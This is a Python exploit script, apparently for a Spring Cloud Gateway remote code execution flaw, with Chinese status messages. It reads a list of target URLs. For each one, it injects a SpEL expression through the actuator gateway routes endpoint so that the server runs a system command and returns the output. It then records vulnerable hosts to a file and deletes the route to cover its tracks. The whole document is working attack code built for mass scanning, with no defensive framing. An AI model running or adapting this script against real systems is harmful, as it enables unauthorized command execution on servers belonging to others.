#-*- coding:utf-8 -*-
import requests
import sys
import json
import argparse
import threading

header={
	"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0", 
	"Accept": "*/*",
	"Accept-Language": "en",
	"Accept-Encoding": "gzip, deflate", 
	"Content-Type": "application/json",
	"Connection": "close",
	"Upgrade-Insecure-Requests": "1"
 }
 
CmdPayload={
  "id": "hacktest",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "name": "Result",
      "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"
    }
  }],
  "uri": "http://example.com"
}

def usage():
	print('''
 ____             _              ____ _                 _ ____   ____ _____ 
/ ___| _ __  _ __(_)_ __   __ _ / ___| | ___  _   _  __| |  _ \ / ___| ____|
\___ \| '_ \| '__| | '_ \ / _` | |   | |/ _ \| | | |/ _` | |_) | |   |  _|  
 ___) | |_) | |  | | | | | (_| | |___| | (_) | |_| | (_| |  _ <| |___| |___ 
|____/| .__/|_|  |_|_| |_|\__, |\____|_|\___/ \__,_|\__,_|_| \_ \\____|_____|
      |_|                 |___/ 
						           Author: Arenid
	''')


def ReqAddGateway(url):
	VulnPath = "/actuator/gateway/routes/hacktest"
	TargetUrl = url+VulnPath
	response = requests.post(url=TargetUrl,headers=header,data=json.dumps(CmdPayload),timeout=3)
	if response.status_code == 201:
		print("[+]路由创建成功!{}".format(TargetUrl))
		
def ReqRefreshGateway(url):
	header["Content-Type"]="application/x-www-form-urlencoded"
	VulnPath="/actuator/gateway/refresh"
	TargetUrl = url+VulnPath
	response = requests.post(url=TargetUrl,headers=header)
	if response.status_code == 200:
		print("[+]路由刷新成功!")

def ReqDelGateway(url):
	VulnPath="/actuator/gateway/routes/hacktest"
	TargetUrl = url+VulnPath
	response = requests.request("DELETE",url=TargetUrl,headers=header,timeout=3)
	if response.status_code == 200:
		print("[+]删除路由成功!{}".format(TargetUrl))		
		
def ReqResult(url):
	header.pop("Content-Type")
	VulnPath="/actuator/gateway/routes/hacktest"
	TargetUrl = url+VulnPath
	response = requests.get(url=TargetUrl,headers=header,timeout=3)
	result = response.text.split(",")
	if "root" in result[2].split(" = ")[1].rstrip("]"):
		print("[+]目标漏洞存在{}".format(TargetUrl))
		with open("succ.txt","a+") as f:
			f.write(url+'\n')
			f.close()
		
def ExploitCmd(url):
	ReqAddGateway(url)
	ReqRefreshGateway(url)
	ReqResult(url)
	ReqDelGateway(url)
	ReqRefreshGateway(url)

def main():
	arg=argparse.ArgumentParser(description="please input your command on line!",usage=usage())
	arg.add_argument('-u','--url',dest="file",type=str,help="Target Url List")
	args=arg.parse_args()
	file=open(args.file)
	urls=file.readlines()
	for url in urls:
		url=url.strip('\n')
		try:
			t=threading.Thread(target=ExploitCmd(url))
			t.start()
		except:
			print("[+]目标不存在此漏洞{}".format(url))
			continue

if __name__ == '__main__':
	main()

